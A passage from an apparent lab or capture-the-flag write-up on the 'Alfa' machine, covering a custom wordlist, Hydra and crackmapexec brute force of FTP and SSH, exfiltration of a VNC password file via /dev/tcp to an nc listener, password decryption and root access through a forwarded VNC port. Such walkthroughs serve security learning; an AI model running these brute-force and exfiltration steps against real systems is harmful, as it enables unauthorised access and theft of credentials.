$ <span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>000..999<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;milo</span>$i<span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span> | tee passwords
milo000
milo001
milo002
milo003
...&lt;snip&gt;...
</code></pre></div><h4 id="brute-force---ftp">Brute force - FTP</h4>
<p>I tried it with Hydra on FTP but returns nothing.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> root@iamf «alfa» «192.168.2.103» 
$ hydra -l thomas -P passwords ftp://192.168.2.103 
Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2021-04-22 03:43:09
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">1000</span> login tries <span style="color:#f92672">(</span>l:1/p:1000<span style="color:#f92672">)</span>, ~63 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ftp://192.168.2.103:21/
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 320.00 tries/min, <span style="color:#ae81ff">320</span> tries in 00:01h, <span style="color:#ae81ff">713</span> to <span style="color:#66d9ef">do</span> in 00:03h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 317.00 tries/min, <span style="color:#ae81ff">634</span> tries in 00:02h, <span style="color:#ae81ff">399</span> to <span style="color:#66d9ef">do</span> in 00:02h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 315.67 tries/min, <span style="color:#ae81ff">947</span> tries in 00:03h, <span style="color:#ae81ff">86</span> to <span style="color:#66d9ef">do</span> in 00:01h, <span style="color:#ae81ff">16</span> active
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target completed, <span style="color:#ae81ff">0</span> valid passwords found
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">15</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">15</span> targets did not resolve or could not be connected
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> targets did not complete
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-04-22 03:46:35
</code></pre></div><h4 id="brute-force---ssh">Brute force - SSH</h4>
<p>This time, I divided the wordlist into two files.</p>
<ul>
<li>passwords1: 000-500</li>
<li>passwords2: 500-999</li>
</ul>
<p>And I&rsquo;ll use <code>crackmapexec</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «alfa» «192.168.2.103» 
$ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port <span style="color:#ae81ff">65111</span>
</code></pre></div><p>After some minutes it returns one valid combination: <code>thomas:milo666</code></p>
<p><img class="img-container" src="imgs/image-20210422151432013.png" alt="image-20210422151432013"  />
</p>
<h4 id="ssh---thomas">SSH - Thomas</h4>
<p>I&rsquo;ll just log in via SSH and grabs the flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ssh -p <span style="color:#ae81ff">65111</span> thomas@192.168.2.109
thomas@192.168.2.109<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Linux Alfa 4.19.0-13-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>

<span style="color:#75715e">####################################################################</span>
<span style="color:#75715e">#                  ,---------------------------,                   #</span>
<span style="color:#75715e">#                  |  /---------------------\  |                   #</span>
<span style="color:#75715e">#                  | |                       | |                   #</span>
<span style="color:#75715e">#                  | |         +----+        | |                   #</span>
<span style="color:#75715e">#                  | |         |ALFA|        | |                   #</span>
<span style="color:#75715e">#                  | |         +----+        | |                   #</span>
<span style="color:#75715e">#                  | |                       | |                   #</span>
<span style="color:#75715e">#                  |  \_____________________/  |                   #</span>
<span style="color:#75715e">#                  |___________________________|                   #</span>
<span style="color:#75715e">#                ,---\_____     []     _______/------,             #</span>
<span style="color:#75715e">#              /         /______________\           /|             #</span>
<span style="color:#75715e">#            /___________________________________ /  | ___         #</span>
<span style="color:#75715e">#            |                                   |   |    )        #</span>
<span style="color:#75715e">#            |  _ _ _                 [-------]  |   |   (         #</span>
<span style="color:#75715e">#            |  o o o                 [-------]  |  /    _)_       #</span>
<span style="color:#75715e">#            |__________________________________ |/     /  /       #</span>
<span style="color:#75715e">#        /-------------------------------------/|      ( )/        #</span>
<span style="color:#75715e">#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #</span>
<span style="color:#75715e">#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #</span>
<span style="color:#75715e">#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #</span>
<span style="color:#75715e">#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #</span>
<span style="color:#75715e">#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #</span>
<span style="color:#75715e">#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #</span>
<span style="color:#75715e">#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #</span>
<span style="color:#75715e">#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #</span>
<span style="color:#75715e">#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #</span>
<span style="color:#75715e">####################################################################</span>

thomas@Alfa:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>thomas<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>thomas<span style="color:#f92672">)</span> grupos<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>thomas<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>
thomas@Alfa:~$ ls -l
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas <span style="color:#ae81ff">1332</span> dic <span style="color:#ae81ff">20</span> 11:04 user.txt
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>In thomas&rsquo;s home directory,  there is a file called <code>.remote-secret</code> and it is owned by root but world-writable.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ ls -la
total <span style="color:#ae81ff">40</span>
drwxr-xr-x <span style="color:#ae81ff">4</span> thomas thomas <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">20</span> 22:22 .
drwxr-xr-x <span style="color:#ae81ff">3</span> root   root   <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">16</span> 07:58 ..
-rw------- <span style="color:#ae81ff">1</span> thomas thomas    <span style="color:#ae81ff">4</span> dic <span style="color:#ae81ff">20</span> 22:22 .bash_history
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas  <span style="color:#ae81ff">220</span> dic <span style="color:#ae81ff">16</span> 07:58 .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas <span style="color:#ae81ff">3526</span> dic <span style="color:#ae81ff">16</span> 07:58 .bashrc
drwx------ <span style="color:#ae81ff">3</span> thomas thomas <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">16</span> 21:15 .gnupg
drwxr-xr-x <span style="color:#ae81ff">3</span> thomas thomas <span style="color:#ae81ff">4096</span> dic <span style="color:#ae81ff">16</span> 20:44 .local
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas  <span style="color:#ae81ff">807</span> dic <span style="color:#ae81ff">16</span> 07:58 .profile
-rwxrwxrwx <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">16</span> dic <span style="color:#ae81ff">17</span> 23:35 .remote_secret
-rw-r--r-- <span style="color:#ae81ff">1</span> thomas thomas <span style="color:#ae81ff">1332</span> dic <span style="color:#ae81ff">20</span> 11:04 user.txt
</code></pre></div><p>At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ cat .remote_secret 
�<span style="color:#e6db74">&#34;�Cc�&#34;</span>�Cc
</code></pre></div><p>Running <a href="https://github.com/DominicBreuker/pspy">pspy</a> discovers a VNC server running locally with root access on port 5901.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">2021/04/22 10:47:57 CMD: UID=0    PID=404    | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth    
</code></pre></div><h4 id="vnc-decrypt">VNC Decrypt</h4>
<p>This <code>.remote_secret</code> is a VNC password file and I could use <a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a> to decrypt it (I&rsquo;ve also done this previously on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-cascade/#decrypt-vnc-password">HTB: Cascade</a>). I&rsquo;ll transfer the file to my attacking machine and decrypt it there.</p>
<p>On Alfa:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ cat .remote_secret &gt; /dev/tcp/192.168.2.103/9000
</code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; remote_secret
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>192.168.2.103<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.2.109<span style="color:#f92672">]</span> <span style="color:#ae81ff">57532</span>
</code></pre></div><p>The file content is decrypted to <code>k!LL3rSs</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ./vncpwd remote_secret 
Password: k!LL3rSs
</code></pre></div><p>I tried the password on root, but it didn&rsquo;t work. Last option here is to access the VNC server.</p>
<h4 id="accessing-vnc">Accessing VNC</h4>
<p>Since the VNC server is not accessible from outside, I&rsquo;ll need a port forwarding to interact with it.</p>
<p>On thomas&rsquo;s session</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ ~C
ssh&gt; -L 5901:localhost:5901 
Forwarding port.
</code></pre></div><p>That will create a tunnel from my Kali localhost:5901 =&gt; Alfa&rsquo;s localhost:5901</p>
<p>Now I can try to connect to the VNC server using <code>vncviewer</code> (it&rsquo;s preinstalled on Kali) and provide <code>remote_secret</code> as the password file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103»  
$ vncviewer -passwd remote_secret 127.0.0.1:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Authentication successful
Desktop name <span style="color:#e6db74">&#34;Alfa:1 (root)&#34;</span>
VNC server default format:
  <span style="color:#ae81ff">32</span> bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red <span style="color:#ae81ff">255</span> green <span style="color:#ae81ff">255</span> blue 255, shift red <span style="color:#ae81ff">16</span> green <span style="color:#ae81ff">8</span> blue <span style="color:#ae81ff">0</span>
Using default colormap which is TrueColor.  Pixel format:
  <span style="color:#ae81ff">32</span> bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red <span style="color:#ae81ff">255</span> green <span style="color:#ae81ff">255</span> blue 255, shift red <span style="color:#ae81ff">16</span> green <span style="color:#ae81ff">8</span> blue <span style="color:#ae81ff">0</span>
Same machine: preferring raw encoding
</code></pre></div><p>It opens this Windows, and I&rsquo;m already on root.</p>
<p><img class="img-container" src="imgs/image-20210422160633799.png" alt="image-20210422160633799"  />
</p>
<p>To be honest, this is actually guessing.</p>
<p>At first I doubt that this remote_secret is shared with root user, but that&rsquo;s how I pwned this machine.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc">https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
